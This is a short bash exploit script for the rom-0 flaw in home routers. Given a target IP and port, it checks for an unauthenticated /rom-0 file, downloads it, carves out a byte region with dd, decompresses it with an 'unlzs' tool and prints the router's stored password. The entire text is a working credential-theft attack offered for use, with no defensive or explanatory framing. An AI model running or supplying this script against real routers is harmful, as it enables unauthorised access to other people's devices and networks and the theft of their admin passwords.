#!/bin/bash
unlzs=./unlzs;
if [ $# -lt 1 ]; then
    echo -ne "\e[1;31m[-] Usage : $0 <IP> [PORT]\e0m\n";
    exit 1;
fi
ip=$1;
port=80;
if [ $# -eq 2 ]; then
    port=$2;
fi
echo -ne "\e[0;32m[+] Checking Remote Host \e[0m\n";
resp=`curl --cookie "C6=rom0" --connect-timeout 5 -I "http://${ip}:${port}/rom-0" 2>/dev/null`;
code=`echo $resp | head -n 1`;
ctype=`echo $resp | grep -i "content-type"`;

if ! [[ "$code" =~ "200 OK" ]] || ! [[ "$ctype" =~ "application/octet-stream" ]]; then
    echo -ne "\e[1;31m[-] Router is not vulnerable! :(\e[0m\n";
    exit 1;
fi
echo -ne "\e[0;32m[+] Downloading rom-0...\e[0m\n";
rm -f /tmp/rom-0;
curl --cookie "C6=rom0" "http://${ip}:${port}/rom-0" -o /tmp/rom-0 2>/dev/null;
echo -ne "\e[0;32m[+] Decompressing rom-0...\e[0m\n";
rm -f /tmp/spt.dat;
dd if=/tmp/rom-0 of=/tmp/spt.dat bs=1 skip=8552 count=39600 2>/dev/null;
rm -f /tmp/data;
dd if=/tmp/spt.dat of=/tmp/data bs=1 count=220 skip=16 2>/dev/null;
pass=`$unlzs /tmp/data | strings | head -n 1`;
echo -ne "\e[0;32m[+] Key Found: \e[1;32m${pass}\e[0m\n";
echo -ne "\e[0;32m[+] Finish :)\e[0m\n";

